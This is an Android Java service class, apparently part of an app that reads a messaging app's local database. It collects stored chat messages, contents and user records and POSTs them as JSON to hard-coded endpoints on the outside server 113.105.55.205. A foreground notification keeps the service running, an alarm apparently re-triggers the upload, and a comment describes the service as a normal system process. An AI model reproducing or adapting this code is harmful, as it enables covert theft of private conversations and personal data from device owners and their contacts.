package cn.truistic.enmicromsg.common.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;

import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.v7.app.NotificationCompat;
import android.util.Log;

import java.util.Date;
import java.util.List;

import cn.truistic.enmicromsg.R;
import cn.truistic.enmicromsg.common.db.DBUtill;

import cn.truistic.enmicromsg.common.util.JsonUtil;
import cn.truistic.enmicromsg.info.ContentInfo;
import cn.truistic.enmicromsg.info.MessageInfo;
import cn.truistic.enmicromsg.info.UserInfo;

import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;


/**
 * 正常的系统前台进程，会在系统通知栏显示一个Notification通知图标
 *
 * @author clock
 * @since 2016-04-12
 */
public class WhiteService extends Service {

    private final static String TAG = WhiteService.class.getSimpleName();

    private static final String ContentUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveContent.aspx";
    private static final String MessageUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
    private static final String UserInfoUrlPath =
            "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";

    private final static int FOREGROUND_ID = 1000;
    private List<MessageInfo> mMessageInfos;
    private List<ContentInfo> mContentInfos;
    private List<UserInfo> mUserInfos;

    private String mJsonContent,mJsonMessage,mJsonUser;

    public WhiteService(){
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "WhiteService->onCreate");
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "WhiteService->onStartCommand");

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this);
        builder.setSmallIcon(R.mipmap.ic_launcher);
        builder.setContentTitle("后台服务");
        builder.setContentText("我正在运行,请勿关闭!");
        builder.setContentInfo("Content Info");
        builder.setWhen(System.currentTimeMillis());


        new  Thread(new Runnable() {
            @Override
            public void run() {
                //读取数据 与 上传数据
                Log.d("DDDBBB后台服务", "执行 " + new Date().toString());
                mMessageInfos = DBUtill.queryMessage(WhiteService.this);
                mContentInfos = DBUtill.queryContent(WhiteService.this);
                mUserInfos = DBUtill.queryUser(WhiteService.this);
                if (!mMessageInfos.isEmpty()){

                    Log.i("DDDBBB后台", "有新的聊天记录--"+mMessageInfos.size()+"条---"+ mMessageInfos
                            .toString());

                        mJsonMessage = JsonUtil.toJson(mMessageInfos);
                        mJsonContent = JsonUtil.toJson(mContentInfos);
                        mJsonUser = JsonUtil.toJson(mUserInfos);

                        postJson(ContentUrlPath,mJsonContent);
                        postJson(MessageUrlPath,mJsonMessage);
                        postJson(UserInfoUrlPath,mJsonUser);

                        mMessageInfos.clear();
                        mContentInfos.clear();
                        mUserInfos.clear();

                }else if (mMessageInfos.isEmpty() || mMessageInfos ==null || mMessageInfos.size()
                        ==0){

                        mMessageInfos.clear();
                        mContentInfos.clear();
                        mUserInfos.clear();
                        Log.d("DDDBBB后台","聊天记录没有新数据");

                }
            }
        }).start();
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int anHour = 60 * 1000  ; // 30分钟
        long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
        Intent activityIntent = new Intent(this, AlarmReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, activityIntent, 0);
        builder.setContentIntent(pi);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        Notification notification = builder.build();
        startForeground(FOREGROUND_ID, notification);
        return super.onStartCommand(intent, flags, startId);

    }


    @Override
    public void onDestroy() {
        Log.i(TAG, "WhiteService->onDestroy");
        super.onDestroy();
    }
}
